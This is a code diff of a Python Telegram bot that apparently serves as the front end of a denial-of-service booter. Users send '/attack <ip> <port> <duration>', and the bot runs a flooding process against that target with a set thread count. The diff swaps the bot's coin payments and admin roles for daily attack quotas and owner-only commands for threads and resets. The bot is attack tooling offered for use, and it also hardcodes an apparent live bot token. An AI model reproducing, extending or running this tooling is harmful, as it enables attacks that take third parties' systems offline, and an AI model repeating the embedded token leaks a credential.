@@ -1,103 +1,82 @@
 import os
 import asyncio
 from telegram import Update, ReplyKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
+from telegram.ext import Application, CommandHandler, CallbackContext
 
 TELEGRAM_BOT_TOKEN = '7246047709:AAElzJRbgodpAq62ql3aSF2CVXkMbHqdzvA'  # Replace with your bot token
 OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
 
-user_coins = {}  
-admins = set()
 is_attack_running = False  # Track if an attack is running
-max_duration = 300  # Max attack duration in seconds
+max_duration = 120  # Max attack duration in seconds
+default_threads = 110  # Default threads for attack
+daily_attack_limit = 10  # Max attacks per user per day
+user_attacks = {}  # Store user attack counts {user_id: remaining_attacks}
 
 # Start Command
 async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    keyboard = [["Balance💰"]]
+    user_id = update.effective_user.id
+
+    if user_id not in user_attacks:
+        user_attacks[user_id] = daily_attack_limit
+
+    keyboard = []
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
     message = (
         "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use /attack <ip> <port> <duration> <threads>*\n\n"
-        "*⚔️ (Costs 5 coins per attack) ⚔️*\n\n"
-        "*Check your balance by clicking the button below!*\n\n"
-        "*Owners & Admins can add coins for users*\n\n"
-        "*⚔️Let the war begin! ⚔️💥*"
+        "*Use /attack <ip> <port> <duration>*\n\n"
+        f"⚔️ *You have {user_attacks[user_id]} attacks left today!* ⚔️\n"
+        f"🧵 *Default Threads*: {default_threads}\n\n"
+        "*💥 Let the war begin!*"
     )
     
     await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=reply_markup)
 
-# Balance Check
-async def balance(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    username = update.effective_user.username or "No Username"
-
-    if user_id not in user_coins:
-        user_coins[user_id] = 0  
-
-    coins = user_coins[user_id]
-
-    message = (
-        f"💰 *Your Balance:*\n"
-        f"👤 *Username:* {username}\n"
-        f"🆔 *User ID:* {user_id}\n"
-        f"💵 *Coins:* {coins}\n\n"
-        f"🔹 *For more coins, contact the owner: @{OWNER_USERNAME}*"
-    )
-
-    await update.message.reply_text(text=message, parse_mode='Markdown')
-
-# Balance Button Click Handler
-async def balance_button(update: Update, context: CallbackContext):
-    if update.message.text == "Balance💰":
-        await balance(update, context)
-
 # Attack Command (Only one attack at a time)
 async def attack(update: Update, context: CallbackContext):
     global is_attack_running  
-    chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
     if is_attack_running:
-        await update.message.reply_text("⚠️ *Please wait, an attack is already running!*", parse_mode='Markdown')
+        await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
         return
 
-    if user_id not in user_coins:
-        user_coins[user_id] = 0  
+    if user_id not in user_attacks:
+        user_attacks[user_id] = daily_attack_limit
 
-    if user_coins[user_id] < 5:
-        await update.message.reply_text("❌ *Not enough coins! You need 5 coins per attack.*", parse_mode='Markdown')
+    if user_attacks[user_id] <= 0:
+        await update.message.reply_text("❌ *You have used all your daily attacks! Wait for reset or ask the owner to reset.*", parse_mode='Markdown')
         return
 
     args = context.args
-    if len(args) != 4:
-        await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
+    if len(args) != 3:
+        await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
         return
 
-    ip, port, duration, threads = args
+    ip, port, duration = args
     duration = int(duration)
-    threads = int(threads)
 
     if duration > max_duration:
         await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
         return
 
-    user_coins[user_id] -= 5  
-    is_attack_running = True  
+    is_attack_running = True  # Mark attack as running
+    user_attacks[user_id] -= 1  # Deduct 1 attack
+    remaining_attacks = user_attacks[user_id]
 
-    await update.message.reply_text( 
-        f"⚔️ *Attack Launched! ⚔️*\n"
-        f"🎯 *Target: {ip}:{port}*\n"
-        f"🕒 *Duration: {duration} sec (Max: {max_duration} sec)*\n"
-        f"🧵 *Threads: {threads}*\n"
-        f"🔥 *Let the battlefield ignite! 💥*",
+    await update.message.reply_text(
+        f"⚔️ *Attack Started!*\n"
+        f"🎯 *Target*: {ip}:{port}\n"
+        f"🕒 *Duration*: {duration} sec\n"
+        f"🧵 *Threads*: {default_threads}\n"
+        f"🔥 *Let the battlefield ignite! 💥*\n\n"
+        f"💥 *You have {remaining_attacks} attacks left today!*",
         parse_mode='Markdown'
     )
 
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, threads, context))  # Run attack in async mode
+    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, default_threads, context))
 
-# Run Attack
+# Run Attack (Non-blocking)
 async def run_attack(chat_id, ip, port, duration, threads, context):
     global is_attack_running
     try:
@@ -108,62 +87,26 @@ async def run_attack(chat_id, ip, port, duration, threads, context):
         )
         await process.communicate()
     finally:
-        is_attack_running = False  
+        is_attack_running = False  # Mark attack as finished
         await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed!*", parse_mode='Markdown')
 
-# Add Coins
-async def add_coins(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if update.effective_user.username != OWNER_USERNAME and user_id not in admins:
-        await update.message.reply_text("❌ *You are not authorized to use this command!*", parse_mode='Markdown')
-        return
-
-    args = context.args
-    if len(args) != 2:
-        await update.message.reply_text("⚠️ *Usage: /addcoins <user_id> <amount>*", parse_mode='Markdown')
-        return
-
-    target_user_id, amount = int(args[0]), int(args[1])
-    user_coins[target_user_id] = user_coins.get(target_user_id, 0) + amount
-    await update.message.reply_text(f"✅ *Added {amount} coins to user {target_user_id}*")
-
-# Add Admin
-async def add_admin(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
+# Set Default Threads (Owner Only)
+async def set_threads(update: Update, context: CallbackContext):
+    global default_threads
 
     if update.effective_user.username != OWNER_USERNAME:
-        await update.message.reply_text("❌ *Only the owner can add admins!*", parse_mode='Markdown')
+        await update.message.reply_text("❌ *Only the owner can set default threads!*", parse_mode='Markdown')
         return
 
     args = context.args
-    if len(args) != 1:
-        await update.message.reply_text("⚠️ *Usage: /addadmin <user_id>*", parse_mode='Markdown')
+    if len(args) != 1 or not args[0].isdigit():
+        await update.message.reply_text("⚠️ *Usage: /setthreads <count>*", parse_mode='Markdown')
         return
 
-    admin_id = int(args[0])
-    admins.add(admin_id)
-    await update.message.reply_text(f"✅ *User {admin_id} is now an admin!*")
+    default_threads = int(args[0])
+    await update.message.reply_text(f"✅ *Default threads set to {default_threads}!*")
 
-# Remove Admin
-async def remove_admin(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-
-    if update.effective_user.username != OWNER_USERNAME:
-        await update.message.reply_text("❌ *Only the owner can remove admins!*", parse_mode='Markdown')
-        return
-
-    args = context.args
-    if len(args) != 1:
-        await update.message.reply_text("⚠️ *Usage: /removeadmin <user_id>*", parse_mode='Markdown')
-        return
-
-    admin_id = int(args[0])
-    admins.discard(admin_id)
-    await update.message.reply_text(f"✅ *User {admin_id} is no longer an admin!*")
-
-# Set Max Attack Duration
+# Set Max Attack Duration (Owner Only)
 async def set_max_duration(update: Update, context: CallbackContext):
     global max_duration
 
@@ -179,18 +122,25 @@ async def set_max_duration(update: Update, context: CallbackContext):
     max_duration = min(int(args[0]), 3600)  
     await update.message.reply_text(f"✅ *Max attack duration set to {max_duration} seconds!*")
 
+# Reset User Attacks (Owner Only)
+async def reset_attacks(update: Update, context: CallbackContext):
+    if update.effective_user.username != OWNER_USERNAME:
+        await update.message.reply_text("❌ *Only the owner can reset attacks!*", parse_mode='Markdown')
+        return
+
+    for user_id in user_attacks:
+        user_attacks[user_id] = daily_attack_limit
+
+    await update.message.reply_text(f"✅ *All users' attack limits have been reset to {daily_attack_limit}!*")
+
 # Main Bot Setup
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(CommandHandler("balance", balance))
-    application.add_handler(CommandHandler("addcoins", add_coins))
-    application.add_handler(CommandHandler("addadmin", add_admin))
-    application.add_handler(CommandHandler("removeadmin", remove_admin))
+    application.add_handler(CommandHandler("setthreads", set_threads))
     application.add_handler(CommandHandler("setmaxduration", set_max_duration))
-
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, balance_button))
+    application.add_handler(CommandHandler("resetattacks", reset_attacks))
 
     application.run_polling()
 
